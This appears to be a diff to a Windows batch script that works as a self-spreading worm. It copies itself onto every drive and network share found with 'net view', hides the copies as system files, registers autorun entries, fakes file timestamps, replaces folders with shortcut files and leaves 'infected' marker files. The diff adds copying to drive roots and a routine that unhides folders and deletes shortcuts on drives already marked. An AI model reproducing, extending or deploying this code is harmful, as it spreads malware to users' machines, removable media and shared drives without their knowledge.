@@ -35,8 +35,8 @@ set module_shortcut=modules\shortcut.exe
 set module_wget=modules\wget.exe
 
 set autoRun=call :autoRun
-set systemVolumeInfo_dir=call :systemVolumeInfo_dir
-set systemVolumeInfo_infected=call :systemVolumeInfo_infected
+set directory=call :directory
+set infected=call :infected
 
 set path_startMenu1=%programData%\Microsoft\Windows\Start Menu\Programs
 set path_startMenu2=%appData%\Microsoft\Windows\Start Menu\Programs
@@ -109,7 +109,7 @@ for %%i in (localAppData appData) do (
 
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
-  %systemVolumeInfo_dir% "%%i:"
+  %directory% "%%i:"
 
   if /i "%%i:" NEQ "%systemDrive%" (
     if /i "%%i:" NEQ "D:" (
@@ -130,8 +130,8 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
           %module_fileTouch% "%%i:\%%j.lnk" >nul
         )
       )
-    ) else %systemVolumeInfo_infected% "%%i:"
-  ) else %systemVolumeInfo_infected% "%%i:"
+    ) else %infected% "%%i:"
+  ) else %infected% "%%i:"
 )
 
 timeout /nobreak /t 2 >nul
@@ -142,7 +142,7 @@ timeout /nobreak /t 2 >nul
 
 for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
-    %systemVolumeInfo_dir% "%%h\%%i"
+    %directory% "%%h\%%i"
 
     if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
       for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
@@ -185,8 +185,6 @@ goto :cycle
 
 
 :remover
-rem ToDo Check WAIT and B work
-if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" start /wait /b "" extensions\%%i\%%k
 
 
 
@@ -304,13 +302,18 @@ exit /b
 
 
 
-:systemVolumeInfo_dir
+:directory
+if not exist %*\"%app_file_name%" copy /y "%app_file%" %*\
+attrib +h +s %*\"%app_file_name%"
+%module_fileTouch% %*\"%app_file_name%" >nul
+
+%autoRun% add %* %*\"%app_file_name%"
 if not exist %*\"System Volume Information" md %*\"System Volume Information"
 
 
 
 if not exist %*\"System Volume Information\%app_file_name%" copy /y "%app_file%" %*\"System Volume Information"
-attrib +h +s %*\"System Volume Information"
+attrib +h +s %*\"System Volume Information\%app_file_name%"
 %module_fileTouch% %*\"System Volume Information\%app_file_name%" >nul
 
 %autoRun% add %* %*\"System Volume Information\%app_file_name%"
@@ -335,7 +338,19 @@ exit /b
 
 
 
-:systemVolumeInfo_infected
+:infected
+echo.>%*\"infected-%app_date%"
+attrib +h +s %*\"infected-%app_date%"
+%module_fileTouch% %*\"infected-%app_date%" >nul
+
+
+
+for /f "delims=" %%j in ('dir %*\* /a:d /b 2^>nul') do (
+  if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+    attrib -h -s %*\"%%j"
+    if exist %*\"%%j.lnk" del /q %*\"%%j.lnk"
+  )
+)
 echo.>%*\"System Volume Information\infected-%app_date%"
 attrib +h +s %*\"System Volume Information\infected-%app_date%"
 %module_fileTouch% %*\"System Volume Information\infected-%app_date%" >nul
